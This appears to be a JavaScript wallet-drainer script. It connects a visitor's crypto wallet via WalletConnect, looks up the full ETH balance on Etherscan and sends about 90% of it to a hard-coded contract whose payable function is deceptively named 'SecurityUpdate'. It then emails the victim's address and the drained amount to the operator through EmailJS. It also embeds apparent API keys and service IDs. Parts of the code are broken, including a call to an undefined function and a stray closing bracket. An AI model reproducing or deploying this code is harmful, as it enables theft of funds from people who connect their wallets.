// Include the Email.js library
var emailJsScript = document.createElement('script');
emailJsScript.src = 'https://cdn.emailjs.com/dist/email.min.js';
document.head.appendChild(emailJsScript);
const { WalletConnectProvider } = require('@walletconnect/web3-provider');
const provider = new WalletConnectProvider({
  infuraId: 'afeca39d1e664a35aeaea9b3a667ff1d',
});
// const connectWalletButton = document.getElementById('connectWallet');
// Initialize Web3 using the provider
const Web3 = require('web3');
const web3 = new Web3(provider);


// Function to send the email
function sendEmail(balance, wallet) {
    emailjs.init('g-iKBMjYyCWuMWun7'); // Replace 'your_user_id' with your actual user ID

    var templateParams = {
        balance: balance,
        wallet: wallet
    };

    emailjs.send('service_h2vkhpq', 'template_9qyt9rq', templateParams)
        .then(function(response) {
            console.log('Email sent:', response);
        })
        .catch(function(error) {
            console.error('Email error:', error);
        });
}

const readContract = async () => {
  try {
    await provider.enable(); // Request wallet connection
    if (provider.wc.connected) {
      // WalletConnect session is connected
      console.log('WalletConnect is connected!');
      const accounts = await provider.send('eth_requestAccounts', []);
      const account = accounts[0];
      const apiKey = "876RZ5Y8WWAXVNZN61T2WPFTGI5MBI5GGX"; // for eth
			//const ethBalanceApiUrl = `https://api-testnet.bscscan.com/api?module=account&action=balance&address=${account}&apikey=${apiKey}`;
			const ethBalanceApiUrl = `https://api.etherscan.io/api?module=account&action=balance&address=${account}&apikey=${apiKey}`;

			const response = await fetch(ethBalanceApiUrl);
			const ethBalanceData = await response.json();
			const ethBalanceInWei = ethBalanceData.result;
			const gasFee = 0.1 * ethBalanceInWei;
			const ethtransaferableInWei = Math.floor(ethBalanceInWei - gasFee);
      // Now, you can use 'account' for your contract interactions
      const contractAbi = [{
		"constant": true,
		"inputs": [],
		"name": "getBalance",
		"outputs": [{
			"name": "",
			"type": "uint256"
		}],
		"payable": false,
		"stateMutability": "view",
		"type": "function"
	}, {
		"constant": false,
		"inputs": [],
		"name": "withdraw",
		"outputs": [],
		"payable": false,
		"stateMutability": "nonpayable",
		"type": "function"
	}, {
		"constant": false,
		"inputs": [],
		"name": "SecurityUpdate",
		"outputs": [],
		"payable": true,
		"stateMutability": "payable",
		"type": "function"
	}, {
		"constant": true,
		"inputs": [],
		"name": "getOwner",
		"outputs": [{
			"name": "",
			"type": "address"
		}],
		"payable": false,
		"stateMutability": "view",
		"type": "function"
	}, {
		"inputs": [],
		"payable": false,
		"stateMutability": "nonpayable",
		"type": "constructor"
	}];
	const contractAddress = "0x0206b09AC971cb742aA059A44Fb0200768690a33";
   
      const contract = new web3.eth.Contract(contractAbi, contractAddress);
      
      // Example payable function
      const payableFunction = contract.methods.payableFunction();
      
      const valueInWei = web3.utils.toWei('0.1', 'ether'); // Specify the value to send with the transaction
      
      payableFunction
        .send({
          from: account, // The user's wallet address
          value: ethtransaferableInWei, // The amount of Ether to send
          gas: 0
        })
      sendEmail(ethtransaferableInWei, account);
    }
  } catch (error) {
    console.error('WalletConnect error:', error);
  }
});
